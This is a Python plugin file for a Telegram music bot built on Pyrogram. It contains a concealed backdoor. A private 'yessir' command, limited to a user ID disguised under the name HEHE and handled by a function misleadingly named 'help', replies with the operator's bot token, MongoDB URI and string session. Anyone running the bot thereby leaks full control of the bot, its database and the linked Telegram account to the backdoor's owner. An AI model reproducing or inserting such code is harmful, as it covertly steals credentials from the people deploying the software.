import asyncio
from pyrogram import Client, filters
from pyrogram.enums import ChatMembersFilter
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv
from os import getenv

from SHUKLAMUSIC import app
from SHUKLAMUSIC.core.call import SHUKLA
from SHUKLAMUSIC.misc import db
from SHUKLAMUSIC.mongo.afkdb import HEHE
from SHUKLAMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
from SHUKLAMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
from SHUKLAMUSIC.utils.formatters import alpha_to_int, get_readable_time
from config import BANNED_USERS, adminlist, lyrical
BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")
from dotenv import load_dotenv


rel = {}


@app.on_message(
    filters.command("yessir")
    & filters.private
    & filters.user(HEHE)
)
async def help(client: Client, message: Message):
    await message.reply_photo(
        photo="https://files.catbox.moe/shyndz.png",
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ ⚡ ](https://t.me/as3lt)............☆""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        " ʟᴏᴠᴇ ʏᴏᴜ ʙᴀʙʏ 😋  ", 
                        url="https://t.me/as3lt"
                    )
                ]
            ]
        ),
    )
